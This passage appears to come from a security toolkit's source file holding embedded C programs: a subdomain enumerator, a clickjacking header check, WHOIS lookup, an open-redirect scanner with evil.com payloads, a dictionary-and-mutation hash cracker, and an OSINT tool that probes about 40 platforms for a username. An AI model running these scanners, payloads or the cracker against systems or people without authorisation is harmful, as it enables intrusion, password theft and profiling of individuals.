    struct timeval tv = {30,0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    SSL_library_init(); SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL *ssl = SSL_new(ctx); SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, "crt.sh");
    SSL_connect(ssl);
    char req[512];
    snprintf(req, 512, "GET /?q=%%25.%s&output=json HTTP/1.1\\r\\nHost: crt.sh\\r\\nUser-Agent: CyberGuard/2.0\\r\\nConnection: close\\r\\n\\r\\n", domain);
    SSL_write(ssl, req, strlen(req));
    char *buf = malloc(BUF); int total = 0, n;
    while ((n = SSL_read(ssl, buf + total, BUF - total - 1)) > 0) total += n;
    buf[total] = '\\0';
    SSL_free(ssl); SSL_CTX_free(ctx); close(sock);
    /* Extract unique subdomains from JSON */
    char found[4096][256];
    int count = 0;
    char *p = buf;
    while ((p = strstr(p, "\\"common_name\\":\\"")) && count < 4096) {
        p += 15;
        char *end = strchr(p, '"');
        if (end && end - p < 255) {
            char sub[256]; int len = end - p;
            strncpy(sub, p, len); sub[len] = '\\0';
            int dup = 0;
            for (int i = 0; i < count; i++) if (strcmp(found[i], sub) == 0) { dup = 1; break; }
            if (!dup) { strcpy(found[count++], sub); printf("  %s\\n", sub); }
        }
        p = end ? end + 1 : p + 1;
    }
    printf("\\n  %d unique subdomains found\\n", count);
    free(buf);
    return 0;
}
`,

clickjacking_tester: `/*
 * Clickjacking Tester - CyberGuard
 * Tests X-Frame-Options and CSP frame-ancestors
 * Compile: gcc -O3 -o clickjacking_tester clickjacking_tester.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <openssl/ssl.h>

#define BUF 65536

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <domain>\\n", argv[0]); return 0; }
    char *host = argv[1];
    if (strncmp(host, "https://", 8)==0) host += 8;
    if (strncmp(host, "http://", 7)==0) host += 7;
    char *s = strchr(host, '/'); if (s) *s = '\\0';
    struct hostent *he = gethostbyname(host);
    if (!he) { fprintf(stderr, "Cannot resolve: %s\\n", host); return 1; }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(443);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    struct timeval tv = {10,0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    SSL_library_init(); SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL *ssl = SSL_new(ctx); SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, host);
    SSL_connect(ssl);
    char req[512]; snprintf(req, 512, "HEAD / HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\n\\r\\n", host);
    SSL_write(ssl, req, strlen(req));
    char buf[BUF]; int n = SSL_read(ssl, buf, BUF-1); buf[n>0?n:0] = '\\0';
    SSL_free(ssl); SSL_CTX_free(ctx); close(sock);
    int xfo = 0, csp_fa = 0;
    if (strcasestr(buf, "X-Frame-Options")) xfo = 1;
    if (strcasestr(buf, "frame-ancestors")) csp_fa = 1;
    printf("\\n  Clickjacking test for: %s\\n\\n", host);
    printf("  X-Frame-Options:     %s\\n", xfo ? "\\033[92mPRESENT\\033[0m" : "\\033[91mMISSING\\033[0m");
    printf("  CSP frame-ancestors: %s\\n", csp_fa ? "\\033[92mPRESENT\\033[0m" : "\\033[91mMISSING\\033[0m");
    if (!xfo && !csp_fa) printf("\\n  \\033[91m[VULNERABLE]\\033[0m Site can be framed — clickjacking possible\\n");
    else printf("\\n  \\033[92m[PROTECTED]\\033[0m Site has anti-clickjacking headers\\n");
    return 0;
}
`,

whois_lookup: `/*
 * WHOIS Lookup - CyberGuard
 * RDAP/WHOIS query for domain info
 * Compile: gcc -O3 -o whois_lookup whois_lookup.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>

#define BUF 32768

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <domain>\\n", argv[0]); return 0; }
    const char *domain = argv[1];
    struct hostent *he = gethostbyname("whois.verisign-grs.com");
    if (!he) { fprintf(stderr, "Cannot resolve WHOIS server\\n"); return 1; }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(43);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    struct timeval tv = {10,0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "Connect failed\\n"); return 1;
    }
    char req[256]; snprintf(req, 256, "%s\\r\\n", domain);
    write(sock, req, strlen(req));
    char buf[BUF] = {0}; int total = 0, n;
    while ((n = read(sock, buf+total, BUF-total-1)) > 0) total += n;
    buf[total] = '\\0';
    close(sock);
    printf("\\n  WHOIS for: %s\\n\\n%s\\n", domain, buf);
    return 0;
}
`,

redirect_checker: `/*
 * Open Redirect Checker - CyberGuard
 * Tests 24 params x 8 payloads = 192 redirect vector tests
 * Full HTTP follow with manual 3xx parsing, multi-threaded
 * Compile: gcc -O3 -o redirect_checker redirect_checker.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pthread.h>
#include <time.h>

#define BUF 16384
#define MAX_THREADS 32

static const char *PARAMS[] = {
    "url","next","redirect","redirect_uri","redirect_url","return","returnTo",
    "return_url","continue","dest","destination","redir","forward","forward_url",
    "out","view","login","link","goto","target","to","ref","site","page"
};
static const int NUM_PARAMS = 24;
static const char *PAYLOADS[] = {
    "https://evil.com","//evil.com","https://evil.com%40target.com",
    "https://target.com@evil.com","https://evil.com%23.target.com",
    "https://evil.com/.target.com","////evil.com","https:%5c%5cevil.com"
};
static const int NUM_PAYLOADS = 8;

typedef struct {
    char host[256]; int port; int use_ssl; char path[2048];
    int vulnerable; char redirect_to[2048]; char param[64]; char payload[512];
} TestJob;

static int parse_url(const char *url, char *host, int *port, char *path, int *use_ssl) {
    *use_ssl = 0; *port = 80;
    const char *p = url;
    if (strncmp(p, "https://", 8) == 0) { p += 8; *use_ssl = 1; *port = 443; }
    else if (strncmp(p, "http://", 7) == 0) { p += 7; }
    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        int hlen = colon - p; strncpy(host, p, hlen); host[hlen] = 0;
        *port = atoi(colon + 1);
        if (slash) strcpy(path, slash); else strcpy(path, "/");
    } else if (slash) {
        int hlen = slash - p; strncpy(host, p, hlen); host[hlen] = 0;
        strcpy(path, slash);
    } else { strcpy(host, p); strcpy(path, "/"); }
    return 0;
}

static int fetch_status_and_location(const char *host, int port, int use_ssl,
                                      const char *path, char *location, size_t loc_size) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(sock); return -1; }
    char req[4096];
    snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: CyberGuard/2.0\\r\\nConnection: close\\r\\n\\r\\n", path, host);
    int status = -1; location[0] = 0;
    if (use_ssl) {
        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
        SSL *ssl = SSL_new(ctx); SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, host);
        if (SSL_connect(ssl) > 0) {
            SSL_write(ssl, req, strlen(req));
            char buf[BUF] = {0}; int n = SSL_read(ssl, buf, BUF - 1);
            if (n > 0) {
                buf[n] = 0;
                if (strncmp(buf, "HTTP/", 5) == 0) status = atoi(buf + 9);
                char *loc = strcasestr(buf, "\\nLocation:");
                if (loc) { loc = strchr(loc, ':') + 1; while (*loc == ' ') loc++;
                    int i = 0; while (*loc && *loc != '\\r' && *loc != '\\n' && i < (int)loc_size - 1) location[i++] = *loc++;
                    location[i] = 0; }
            }
        }
        SSL_free(ssl); SSL_CTX_free(ctx);
    } else {
        write(sock, req, strlen(req));
        char buf[BUF] = {0}; int n = read(sock, buf, BUF - 1);
        if (n > 0) {
            buf[n] = 0;
            if (strncmp(buf, "HTTP/", 5) == 0) status = atoi(buf + 9);
            char *loc = strcasestr(buf, "\\nLocation:");
            if (loc) { loc = strchr(loc, ':') + 1; while (*loc == ' ') loc++;
                int i = 0; while (*loc && *loc != '\\r' && *loc != '\\n' && i < (int)loc_size - 1) location[i++] = *loc++;
                location[i] = 0; }
        }
    }
    close(sock); return status;
}

static void *test_redirect(void *arg) {
    TestJob *job = (TestJob *)arg;
    char fp[4096]; char sep = strchr(job->path, '?') ? '&' : '?';
    snprintf(fp, sizeof(fp), "%s%c%s=%s", job->path, sep, job->param, job->payload);
    char location[2048] = {0};
    int status = fetch_status_and_location(job->host, job->port, job->use_ssl, fp, location, sizeof(location));
    if (status >= 300 && status < 400 && location[0] && strstr(location, "evil.com")) {
        job->vulnerable = 1; strncpy(job->redirect_to, location, 2047);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <url> [-t threads] [-j]\\n\\nTests %d x %d = %d vectors\\n",
        argv[0], NUM_PARAMS, NUM_PAYLOADS, NUM_PARAMS*NUM_PAYLOADS); return 0; }
    SSL_library_init(); SSL_load_error_strings();
    int nthreads = MAX_THREADS, json_out = 0;
    for (int i=2;i<argc;i++) { if(!strcmp(argv[i],"-t")&&i+1<argc)nthreads=atoi(argv[++i]); else if(!strcmp(argv[i],"-j"))json_out=1; }
    char host[256], path[2048]; int port, use_ssl;
    parse_url(argv[1], host, &port, path, &use_ssl);
    int total = NUM_PARAMS * NUM_PAYLOADS;
    TestJob *jobs = calloc(total, sizeof(TestJob));
    int idx = 0;
    for (int p=0;p<NUM_PARAMS;p++) for (int t=0;t<NUM_PAYLOADS;t++) {
        strncpy(jobs[idx].host,host,255); jobs[idx].port=port; jobs[idx].use_ssl=use_ssl;
        strncpy(jobs[idx].path,path,2047); strncpy(jobs[idx].param,PARAMS[p],63);
        strncpy(jobs[idx].payload,PAYLOADS[t],511); idx++;
    }
    struct timespec ts,te; clock_gettime(CLOCK_MONOTONIC,&ts);
    printf("\\n  Open Redirect scan: %s\\n  Tests: %d | Threads: %d\\n\\n", argv[1], total, nthreads);
    pthread_t *threads = malloc(nthreads * sizeof(pthread_t));
    int i=0;
    while (i<total) {
        int batch = (total-i<nthreads)?total-i:nthreads;
        for (int j=0;j<batch;j++) pthread_create(&threads[j],NULL,test_redirect,&jobs[i+j]);
        for (int j=0;j<batch;j++) pthread_join(threads[j],NULL);
        i+=batch;
    }
    clock_gettime(CLOCK_MONOTONIC,&te);
    double elapsed=(te.tv_sec-ts.tv_sec)+(te.tv_nsec-ts.tv_nsec)/1e9;
    int vuln=0; for(int j=0;j<total;j++) if(jobs[j].vulnerable) vuln++;
    if (json_out) {
        printf("{\\n  \\"url\\": \\"%s\\",\\n  \\"tests\\": %d,\\n  \\"vulnerable\\": %d,\\n  \\"elapsed\\": %.2f,\\n  \\"findings\\": [\\n",
            argv[1], total, vuln, elapsed);
        int first=1;
        for (int j=0;j<total;j++) if(jobs[j].vulnerable) {
            if(!first)printf(",\\n"); first=0;
            printf("    {\\"param\\": \\"%s\\", \\"payload\\": \\"%s\\", \\"redirect\\": \\"%s\\"}", jobs[j].param, jobs[j].payload, jobs[j].redirect_to);
        }
        printf("\\n  ]\\n}\\n");
    } else {
        for (int j=0;j<total;j++) if(jobs[j].vulnerable)
            printf("  \\033[91m[VULN]\\033[0m ?%s=%s -> %s\\n", jobs[j].param, jobs[j].payload, jobs[j].redirect_to);
        printf("\\n  %s\\n  Tests: %d | Vulnerable: %d | Time: %.2fs\\n",
            vuln>0?"\\033[91m[VULNERABLE]\\033[0m Open redirect found!":"\\033[92m[SAFE]\\033[0m No open redirect detected", total, vuln, elapsed);
    }
    free(jobs); free(threads); return 0;
}
`,

// Alias: BruteForcePage uses toolSlug="brute"
brute: `/*
 * Brute Force Hash Cracker - CyberGuard (Ultra Performance)
 * Multi-threaded dictionary + smart mutations + charset brute-force a-z(4)
 * 70+ common passwords, leet speak, suffix/prefix, reverse, double
 * Compile: gcc -O3 -march=native -flto -o brute brute.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define MAX_THREADS 16
#define MAX_WORD 128

static volatile int found = 0;
static char found_pw[MAX_WORD];
static unsigned long long total_attempts = 0;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

static const char *COMMON[] = {
    "password","123456","12345678","qwerty","abc123","monkey","1234567","letmein",
    "trustno1","dragon","baseball","iloveyou","master","sunshine","ashley","bailey",
    "shadow","123123","654321","superman","qazwsx","michael","football","password1",
    "password123","admin","admin123","root","toor","changeme","welcome","hello",
    "charlie","donald","login","princess","solo","passw0rd","starwars","access",
    "flower","hottie","loveme","pepper","robert","matthew","daniel","andrew",
    "joshua","123456789","1234567890","abcdef","test","test123","guest",
    "guest123","pass","pass123","p@ssw0rd","P@ssw0rd","Password1","Password123",
    "Admin123","Root123","azerty","azerty123","qwerty123","secret","letmein1",
};
static const int NUM_COMMON = sizeof(COMMON) / sizeof(COMMON[0]);

static void compute_hash(const char *algo, const char *input, char *out) {
    const EVP_MD *md = EVP_get_digestbyname(algo);
    if (!md) { out[0] = 0; return; }
    unsigned char digest[EVP_MAX_MD_SIZE]; unsigned int dlen;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(ctx, md, NULL);
    EVP_DigestUpdate(ctx, input, strlen(input));
    EVP_DigestFinal_ex(ctx, digest, &dlen);
    EVP_MD_CTX_free(ctx);
    for (unsigned int i = 0; i < dlen; i++) sprintf(out + i*2, "%02x", digest[i]);
    out[dlen*2] = 0;
}

static int try_w(const char *w, const char *target, const char *algo) {
    if (found) return 1;
    char h[256]; compute_hash(algo, w, h);
    pthread_mutex_lock(&lock); total_attempts++; pthread_mutex_unlock(&lock);
    if (strcasecmp(h, target) == 0) { found = 1; strncpy(found_pw, w, MAX_WORD-1); return 1; }
    return 0;
}

static void mutations(const char *base, const char *target, const char *algo) {
    char m[MAX_WORD];
    if (try_w(base, target, algo)) return;
    strncpy(m, base, MAX_WORD-1); m[MAX_WORD-1]=0;
    if (m[0]) m[0]=toupper(m[0]); if (try_w(m, target, algo)) return;
    strncpy(m, base, MAX_WORD-1); for (int i=0; m[i]; i++) m[i]=toupper(m[i]); if (try_w(m, target, algo)) return;
    strncpy(m, base, MAX_WORD-1);
    for (int i=0; m[i]; i++) { switch(tolower(m[i])){ case 'a':m[i]='@';break;case 'e':m[i]='3';break;case 'i':m[i]='1';break;case 'o':m[i]='0';break;case 's':m[i]='$';break;case 't':m[i]='7';break;default:break;} }
    if (try_w(m, target, algo)) return;
    for (int n=0; n<=9999 && !found; n++) { snprintf(m,MAX_WORD,"%s%d",base,n); if (try_w(m,target,algo)) return; }
    const char syms[] = "!@#$%^&*?_-+=.";
    for (int i=0; syms[i] && !found; i++) { snprintf(m,MAX_WORD,"%s%c",base,syms[i]); if (try_w(m,target,algo)) return; }
    int len=strlen(base); strncpy(m,base,MAX_WORD-1);
    for (int i=0;i<len/2;i++){char t=m[i];m[i]=m[len-1-i];m[len-1-i]=t;} if (try_w(m,target,algo)) return;
    snprintf(m,MAX_WORD,"%s%s",base,base); try_w(m,target,algo);
}

typedef struct { const char *target; const char *algo; int id; int total; } Job;

static void *crack_thread(void *arg) {
    Job *j = (Job*)arg;
    for (int i=j->id; i<NUM_COMMON && !found; i+=j->total) mutations(COMMON[i], j->target, j->algo);
    if (!found && j->id == 0) {
        char m[5];
        for (int a=0;a<26&&!found;a++){m[0]='a'+a;m[1]=0;try_w(m,j->target,j->algo);
        for (int b=0;b<26&&!found;b++){m[1]='a'+b;m[2]=0;try_w(m,j->target,j->algo);
        for (int c=0;c<26&&!found;c++){m[2]='a'+c;m[3]=0;try_w(m,j->target,j->algo);
        for (int d=0;d<26&&!found;d++){m[3]='a'+d;m[4]=0;try_w(m,j->target,j->algo);}}}}
    }
    return NULL;
}

static const char *detect_algo(const char *h) {
    size_t l=strlen(h); if(l==32) return "MD5"; if(l==40) return "SHA1";
    if(l==64) return "SHA256"; if(l==128) return "SHA512"; return "SHA256";
}

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <hash> [-a md5|sha1|sha256|sha512] [-t threads] [-j]\\n", argv[0]); return 0; }
    const char *target=argv[1], *algo=detect_algo(target);
    int nt=MAX_THREADS, json_out=0;
    for (int i=2;i<argc;i++){if(!strcmp(argv[i],"-a")&&i+1<argc)algo=argv[++i];else if(!strcmp(argv[i],"-t")&&i+1<argc)nt=atoi(argv[++i]);else if(!strcmp(argv[i],"-j"))json_out=1;}
    if (nt>MAX_THREADS) nt=MAX_THREADS;
    printf("\\n  Target: %s\\n  Algo: %s | Threads: %d\\n  Dict: %d words + mutations + brute a-z(4)\\n\\n", target, algo, nt, NUM_COMMON);
    struct timespec ts,te; clock_gettime(CLOCK_MONOTONIC,&ts);
    Job jobs[MAX_THREADS]; pthread_t threads[MAX_THREADS];
    for(int i=0;i<nt;i++){jobs[i]=(Job){target,algo,i,nt};pthread_create(&threads[i],NULL,crack_thread,&jobs[i]);}
    for(int i=0;i<nt;i++) pthread_join(threads[i],NULL);
    clock_gettime(CLOCK_MONOTONIC,&te);
    double elapsed=(te.tv_sec-ts.tv_sec)+(te.tv_nsec-ts.tv_nsec)/1e9;
    double speed=total_attempts/(elapsed>0?elapsed:0.001);
    if (json_out) printf("{\\n  \\"found\\": %s,\\n  \\"password\\": \\"%s\\",\\n  \\"attempts\\": %llu,\\n  \\"speed_hs\\": %.0f,\\n  \\"time_s\\": %.3f\\n}\\n",
        found?"true":"false",found?found_pw:"",total_attempts,speed,elapsed);
    else { if(found)printf("  \\033[92m[CRACKED]\\033[0m %s\\n",found_pw);else printf("  \\033[91m[NOT FOUND]\\033[0m\\n");
        printf("  Attempts: %llu | Speed: %.0f H/s | Time: %.3fs\\n",total_attempts,speed,elapsed); }
    return 0;
}
`,

deductoscope: `/*
 * DeductOScope - CyberGuard OSINT Framework (C Ultra Performance)
 * Multi-module: username enum (40+ platforms), email, domain, IP, phone
 * DNS 9 types, WHOIS/RDAP, CT subdomains, Shodan InternetDB, Geolocation
 * Compile: gcc -O3 -march=native -flto -o deductoscope deductoscope.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define BUF 32768
#define MAX_THREADS 40
#define TIMEOUT_SEC 6
#define MAX_SUBS 500

#define CR "\\033[91m"
#define CG "\\033[92m"
#define CY "\\033[93m"
#define CC2 "\\033[96m"
#define CW "\\033[97m"
#define CD "\\033[90m"
#define CBOLD "\\033[1m"
#define XRST "\\033[0m"

typedef enum { T_USER, T_MAIL, T_DOM, T_IP, T_PHN } TT;

static TT det(const char *t) {
    if (strchr(t,'@')) return T_MAIL;
    int d=0,n=0,l=strlen(t);
    for(int i=0;i<l;i++){if(t[i]=='.')d++;if(isdigit(t[i]))n++;}
    if(d==3&&n+3>=l) return T_IP;
    if(t[0]=='+'||(l>6&&n>l-3)) return T_PHN;
    if(d>0&&l>3) return T_DOM;
    return T_USER;
}

typedef struct{int st;char body[BUF];int bl;}HR;

static int tconn(const char *h,int p){
    struct hostent*he=gethostbyname(h);if(!he)return-1;
    int s=socket(AF_INET,SOCK_STREAM,0);if(s<0)return-1;
    struct sockaddr_in a={0};a.sin_family=AF_INET;a.sin_port=htons(p);
    memcpy(&a.sin_addr,he->h_addr_list[0],he->h_length);
    struct timeval tv={TIMEOUT_SEC,0};
    setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
    setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    if(connect(s,(struct sockaddr*)&a,sizeof(a))<0){close(s);return-1;}
    return s;
}

static HR hget(const char*h,const char*path,int ssl,int port){
    HR r={0};r.st=-1;
    int s=tconn(h,port>0?port:(ssl?443:80));if(s<0)return r;
    char rq[4096];snprintf(rq,sizeof(rq),"GET %s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: DeductOScope/3.0\\r\\nAccept: application/json\\r\\nConnection: close\\r\\n\\r\\n",path,h);
    if(ssl){SSL_CTX*ctx=SSL_CTX_new(TLS_client_method());SSL*sl=SSL_new(ctx);SSL_set_fd(sl,s);SSL_set_tlsext_host_name(sl,h);
        if(SSL_connect(sl)>0){SSL_write(sl,rq,strlen(rq));int t=0,n;while(t<BUF-1&&(n=SSL_read(sl,r.body+t,BUF-1-t))>0)t+=n;r.body[t]=0;r.bl=t;if(t>12&&!strncmp(r.body,"HTTP/",5))r.st=atoi(r.body+9);}
        SSL_free(sl);SSL_CTX_free(ctx);
    }else{write(s,rq,strlen(rq));int t=0,n;while(t<BUF-1&&(n=read(s,r.body+t,BUF-1-t))>0)t+=n;r.body[t]=0;r.bl=t;if(t>12&&!strncmp(r.body,"HTTP/",5))r.st=atoi(r.body+9);}
    close(s);return r;
}

static const char*bptr(const char*r){const char*p=strstr(r,"\\r\\n\\r\\n");return p?p+4:r;}

static void xstr(const char*j,const char*k,char*o,int m){
    char p[80];snprintf(p,80,"\\"%s\\":\\"",k);const char*f=strstr(j,p);
    if(!f){o[0]=0;return;}f+=strlen(p);int i=0;while(f[i]&&f[i]!='"'&&i<m-1){o[i]=f[i];i++;}o[i]=0;
}

typedef struct{const char*nm;const char*h;const char*pf;int ssl;int jc;}Plat;
static const Plat PL[]={
    {"GitHub","api.github.com","/users/%s",1,1},{"Reddit","www.reddit.com","/user/%s/about.json",1,1},
    {"HackerNews","hacker-news.firebaseio.com","/v0/user/%s.json",1,1},
    {"Dev.to","dev.to","/api/users/by_username?url=%s",1,1},
    {"Lichess","lichess.org","/api/user/%s",1,1},{"Chess.com","api.chess.com","/pub/player/%s",1,1},
    {"DockerHub","hub.docker.com","/v2/users/%s/",1,1},{"Codewars","www.codewars.com","/api/v1/users/%s",1,1},
    {"RubyGems","rubygems.org","/api/v1/profiles/%s.json",1,1},{"Gravatar","en.gravatar.com","/%s.json",1,1},
    {"npm","registry.npmjs.org","/-/user/org.couchdb.user:%s",1,1},
    {"PyPI","pypi.org","/user/%s/",1,0},{"Pastebin","pastebin.com","/u/%s",1,0},
    {"Replit","replit.com","/@%s",1,0},{"Spotify","open.spotify.com","/user/%s",1,0},
    {"SoundCloud","soundcloud.com","/%s",1,0},{"Twitch","www.twitch.tv","/%s",1,0},
    {"YouTube","www.youtube.com","/@%s",1,0},{"TikTok","www.tiktok.com","/@%s",1,0},
    {"Twitter/X","twitter.com","/%s",1,0},{"Instagram","www.instagram.com","/%s/",1,0},
    {"Pinterest","www.pinterest.com","/%s/",1,0},{"Flickr","www.flickr.com","/people/%s/",1,0},
    {"Imgur","imgur.com","/user/%s",1,0},{"BuyMeACoffee","www.buymeacoffee.com","/%s",1,0},
    {"Ko-fi","ko-fi.com","/%s",1,0},{"Linktree","linktr.ee","/%s",1,0},
    {"About.me","about.me","/%s",1,0},{"Trello","trello.com","/%s",1,0},
    {"Mastodon","mastodon.social","/@%s",1,0},{"LeetCode","leetcode.com","/%s/",1,0},
    {"Medium","medium.com","/@%s",1,0},{"Telegram","t.me","/%s",1,0},
    {"VK","vk.com","/%s",1,0},{"GitLab","gitlab.com","/%s",1,0},
    {"Bitbucket","bitbucket.org","/%s",1,0},{"Keybase","keybase.io","/%s",1,0},
    {"Codeforces","codeforces.com","/profile/%s",1,0},
    {"HackTheBox","www.hackthebox.com","/home/users/profile/%s",1,0},
    {"TryHackMe","tryhackme.com","/p/%s",1,0},
};
static const int NP=sizeof(PL)/sizeof(PL[0]);

typedef struct{const Plat*p;const char*u;int f;}PJ;

static void*ckp(void*a){PJ*j=(PJ*)a;char pa[512];snprintf(pa,512,j->p->pf,j->u);
    HR r=hget(j->p->h,pa,j->p->ssl,0);
    if(r.st==200){if(j->p->jc){const char*b=bptr(r.body);j->f=(b[0]=='{'||b[0]=='[')&&!strstr(b,"\\"error\\"")&&!strstr(b,"\\"Not Found\\"")?1:0;}else j->f=1;}
    else j->f=r.st<0?-1:0;return NULL;}

static void m_user(const char*u){
    printf("\\n%s[MOD] Username - %d platforms%s\\n",CC2,NP,XRST);
    PJ js[42];for(int i=0;i<NP;i++){js[i].p=&PL[i];js[i].u=u;js[i].f=0;}
    struct timespec ts,te;clock_gettime(CLOCK_MONOTONIC,&ts);
    pthread_t th[MAX_THREADS];int i=0;
    while(i<NP){int b=(NP-i<MAX_THREADS)?NP-i:MAX_THREADS;
        for(int j=0;j<b;j++)pthread_create(&th[j],NULL,ckp,&js[i+j]);
        for(int j=0;j<b;j++)pthread_join(th[j],NULL);i+=b;}
    clock_gettime(CLOCK_MONOTONIC,&te);double el=(te.tv_sec-ts.tv_sec)+(te.tv_nsec-ts.tv_nsec)/1e9;
    int fc=0;for(int j=0;j<NP;j++)if(js[j].f==1){fc++;printf("  %s[+]%s %s\\n",CG,XRST,js[j].p->nm);}
    printf("  %s%d found / %d tested | %.1fs%s\\n",CC2,fc,NP,el,XRST);
}

static void m_dns(const char*d){
    printf("\\n%s[MOD] DNS%s\\n",CC2,XRST);
    const char*ty[]={"A","AAAA","MX","NS","TXT","CNAME","SOA","CAA","SRV"};
    for(int i=0;i<9;i++){char pa[512];snprintf(pa,512,"/resolve?name=%s&type=%s",d,ty[i]);
        HR r=hget("dns.google",pa,1,0);if(r.st==200){const char*b=bptr(r.body);
            if(strstr(b,"\\"Answer\\"")){printf("  %s[+]%s %-5s: ",CG,XRST,ty[i]);
                const char*p=b;int c=0;while((p=strstr(p,"\\"data\\":\\""))&&c<5){p+=8;const char*e=strchr(p,'"');if(e){if(c)printf(", ");printf("%.*s",(int)(e-p),p);c++;p=e+1;}}printf("\\n");}}}
}

static void m_ip(const char*ip){
    printf("\\n%s[MOD] IP Intel%s\\n",CC2,XRST);
    char pa[256];snprintf(pa,256,"/json/%s?fields=66846719",ip);
    HR r=hget("ip-api.com",pa,0,80);
    if(r.st==200){const char*b=bptr(r.body);char co[64],ci[64],is[128],as[128];
        xstr(b,"country",co,64);xstr(b,"city",ci,64);xstr(b,"isp",is,128);xstr(b,"as",as,128);
        printf("  %s[+]%s %s, %s | %s | %s\\n",CG,XRST,ci,co,is,as);}
    snprintf(pa,256,"/%s",ip);r=hget("internetdb.shodan.io",pa,1,0);
    if(r.st==200){const char*b=bptr(r.body);
        const char*p=strstr(b,"\\"ports\\":[");if(p){printf("  %s[+]%s Ports: ",CG,XRST);p+=9;int c=0;while(*p&&*p!=']'&&c<20){if(isdigit(*p)){if(c)printf(",");while(isdigit(*p)){putchar(*p);p++;}c++;}else p++;}printf("\\n");}
        const char*v=strstr(b,"\\"vulns\\":[");if(v&&v[9]!=']'){printf("  %s[!]%s CVEs: ",CR,XRST);v+=9;int c=0;while(*v&&*v!=']'&&c<10){if(*v=='"'){v++;if(c)printf(",");while(*v&&*v!='"'){putchar(*v);v++;}if(*v)v++;c++;}else v++;}printf("\\n");}}
    unsigned a2,b2,c2,d2;if(sscanf(ip,"%u.%u.%u.%u",&a2,&b2,&c2,&d2)==4){
        snprintf(pa,256,"/resolve?name=%u.%u.%u.%u.in-addr.arpa&type=PTR",d2,c2,b2,a2);
        r=hget("dns.google",pa,1,0);if(r.st==200){const char*b=bptr(r.body);const char*d=strstr(b,"\\"data\\":\\"");
            if(d){d+=8;printf("  %s[+]%s rDNS: ",CG,XRST);while(*d&&*d!='"'){putchar(*d);d++;}printf("\\n");}}}
}

static void m_whois(const char*dom){
    printf("\\n%s[MOD] WHOIS%s\\n",CC2,XRST);
    const char*tld=strrchr(dom,'.');if(!tld)return;tld++;
    const char*h;char bp[256];
    if(!strcmp(tld,"com")||!strcmp(tld,"net")){h="rdap.verisign.com";snprintf(bp,256,"/%s/v1/domain/%s",tld,dom);}
    else{h="rdap.org";snprintf(bp,256,"/domain/%s",dom);}
    HR r=hget(h,bp,1,0);if(r.st==200){const char*b=bptr(r.body);
        const char*rg=strstr(b,"registration");if(rg){const char*d=strstr(rg,"\\"eventDate\\":\\"");if(d){d+=14;printf("  %s[+]%s Created: ",CG,XRST);int i=0;while(d[i]&&d[i]!='T'&&i<10){putchar(d[i]);i++;}printf("\\n");}}
        const char*ex=strstr(b,"expiration");if(ex){const char*d=strstr(ex,"\\"eventDate\\":\\"");if(d){d+=14;printf("  %s[+]%s Expires: ",CG,XRST);int i=0;while(d[i]&&d[i]!='T'&&i<10){putchar(d[i]);i++;}printf("\\n");}}}
}

